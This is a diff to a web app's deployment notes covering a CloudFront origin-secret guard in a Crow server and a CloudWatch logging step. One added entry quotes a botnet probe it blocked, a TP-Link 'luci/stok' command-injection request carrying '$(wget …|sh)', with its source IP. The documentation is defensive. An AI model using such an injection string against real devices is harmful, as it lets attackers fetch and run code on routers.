@@ -240,6 +240,8 @@ Since we're dropping nginx, Crow needs to enforce the CloudFront-origin secret i
   - Health allow-list: `/api/health` and `/api/health/db` pass through without header; `/api/login` and `/` are rejected; `/api/healthz` is documented as currently allowed (canary test that pins the simple-prefix-match decision so a future tightening is deliberate).
   - `after_handle` is a no-op (preserves response body + code).
 - [x] **Operator wiring** (Phase 4.6): set `KNOTTYYOGA_ORIGIN_SECRET=<random>` in `/etc/knottyyoga/server.env` and the matching `X-Origin-Secret` value as a CloudFront "Origin custom header" on the `/api/*` behavior. ✅ both halves done (4.4 env file, 4.6 origin header, 9/17). Rotation is written up in `RUNBOOK.md` §5 (CloudFront first, then env file + restart, ~30s of 403s; overlap window skipped for v1).
+	- ✅ **Confirmed working against real traffic within hours of going live** (9/25). A botnet probing the EC2's public IP directly for the TP-Link `luci`/`stok` command-injection flaw — `GET /cgi-bin/luci/;stok=/locale?…country=$(wget …|sh)` from `221.159.119.6` — was answered **403** by the guard, with `CloudFrontOriginGuard rejected direct-origin request (header missing)`. That is the exact bypass the guard exists to stop, and the reason Phase 4.2 left port 80 open to `0.0.0.0/0` rather than chasing CloudFront's churning egress ranges in a security group. The guard also self-suppresses (`further rejections suppressed for 1 min`), so a scanner cannot flood the journal or the CloudWatch ingest. Expect a steady trickle of these; they are noise. If the volume ever warrants attention, a CloudWatch **metric filter** on `CloudFrontOriginGuard rejected` turns it into a graph line instead of log lines.
+	- The **scheduler helper supplies the header itself** (`knottyyoga_job_catalog.cpp` builds it from the same `server.env`), which is why its `POST /api/login` from `172.17.0.1` returns 200 while the scanner gets 403 — same guard, one caller configured and one not.
 
 ---
 
@@ -1324,7 +1326,7 @@ Within a minute, `/knottyyoga/ec2` should hold two streams. Nothing appearing �
 
 **Step 6 — read them.** Each event arrives as a JSON record, and **the Crow/scheduler line is the `MESSAGE` field** — everything around it (`_SYSTEMD_UNIT`, `_PID`, `_CMDLINE`, …) is journal metadata fluent-bit carries along. A raw stream full of that envelope looks wrong the first time; it is not.
 
-Read it through **Logs → Log Insights** (or *Search all log streams* on the group page) against `/knottyyoga/ec2`:
+Read it through **Logs → Log Analytics** (the console's name for Logs Insights — there is no "Log Insights" entry), or via *Search all log streams* on the group page, against `/knottyyoga/ec2`:
 
 ```
 fields @timestamp, MESSAGE
